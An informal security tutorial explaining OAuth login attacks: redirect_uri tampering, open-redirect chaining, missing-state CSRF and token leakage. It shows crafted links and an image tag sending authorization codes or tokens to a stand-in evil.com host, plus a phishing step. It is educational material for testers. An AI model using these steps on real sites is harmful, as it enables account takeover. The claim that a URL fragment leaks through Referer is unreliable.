First: What OAuth Login Actually Does (Simple)
When you click:

👉 “Login with Google”

Behind the scenes:
Website sends you to Google:

https://accounts.google.com/o/oauth2/auth?
 client_id=APP123
 &redirect_uri=https://victim.com/callback

You login on Google

Google sends you back:
https://victim.com/callback?code=ABC123
Website uses this code to log you in

👉 IMPORTANT:
That code=ABC123 is like a temporary password

If attacker gets it → they can login as you

🚨 NOW THE REAL ATTACK (STEP BY STEP)


🔥 Attack 1: Redirect URI Manipulation (MAIN ATTACK)
🎯 Goal:
Make OAuth send the code to attacker instead of victim site
👨‍💻 Step 1: Attacker Finds OAuth URL
Attacker goes to login page → clicks "Login with Google"
Captures request using Burp Suite

He sees something like:
https://accounts.google.com/o/oauth2/auth?
 client_id=APP123
 &redirect_uri=https://victim.com/callback
 &response_type=code
   
🧪 Step 2: Attacker Tests Injection
He changes:
redirect_uri=https://evil.com
Sends request

❌ If secure:
Server rejects → attack fails

✅ If vulnerable:
Server accepts → BIG PROBLEM

💣 Step 3: Create Malicious Link
Attacker creates:

https://accounts.google.com/o/oauth2/auth?
 client_id=APP123
 &redirect_uri=https://evil.com
 &response_type=code
   
🎯 Step 4: Send to Victim
Attacker sends link via:

phishing email
chat message
fake login page

👤 Step 5: Victim Clicks Link
Victim sees:
👉 Google login page (looks legit)
Victim logs in

💥 Step 6: Google Redirects
Instead of going to victim site:
https://evil.com?code=VICTIM_CODE
👉 Attacker server receives this

🧠 Step 7: Attacker Uses Code

Attacker now sends this to victim app:

POST /token
code=VICTIM_CODE

👉 Gets access token → logs in as victim

🔥 THIS IS FULL ACCOUNT TAKEOVER
❗ YOUR MAIN CONFUSION (IMPORTANT)
❓ “How attacker inject URL?”
👉 Attacker does NOT inject into server

👉 He simply:
Takes original OAuth URL
Modifies parameters manually
Sends that link to victim
💡 Think like this:

OAuth URL = just a normal URL
Anyone can change it like:
https://example.com?param=value
👉 Attacker edits param=value

🔥 Attack 2: Open Redirect Chaining (VERY REALISTIC)
🎯 Situation:

Server only allows:

redirect_uri=https://victim.com/*
🧪 Attacker Finds Open Redirect

Example:
https://victim.com/redirect?url=ANYTHING

💣 Exploit
Attacker uses:
redirect_uri=https://victim.com/redirect?url=https://evil.com
  
🔁 Flow:
Victim logs in
Redirect to:
victim.com/redirect?url=https://evil.com&code=XYZ
victim.com redirects again:
https://evil.com?code=XYZ

👉 Attacker still gets code 😈

🔥 Attack 3: Missing State (CSRF)
🎯 Goal:
Force victim to login into attacker account

💣 Steps:
Step 1: Attacker logs in normally
Gets:
https://victim.com/callback?code=ATTACKER_CODE
Step 2: Attacker sends this link to victim
Step 3: Victim clicks

If no state check:

👉 victim gets logged into attacker account

🔥 Impact:
Data confusion
Session hijack
Account linking abuse
🔥 Attack 4: Token Leakage
🎯 Problem:

Token is in URL:
https://victim.com/callback#access_token=ABC123
💣 Attack:
Page loads:
<img src="https://evil.com/log">
Browser sends:
Referer: https://victim.com/callback#access_token=ABC123

👉 Token leaked

🧠 REAL HACKER MINDSET

When you test OAuth:

✔️ Step-by-step checklist
1. Capture OAuth request (Burp)
2. Modify:
redirect_uri
state
response_type
3. Try:
your domain
open redirect
encoded payload
4. Observe:
where code goes
is state validated?
is token exposed?
🔥 SIMPLE ANALOGY (BEST WAY TO UNDERSTAND)

Think:

OAuth = courier delivering parcel (code)
redirect_uri = delivery address
👉 Attacker changes address:
Instead of:
Deliver to: victim.com
he writes:
Deliver to: evil.com

👉 Courier (OAuth server) delivers to attacker 😈
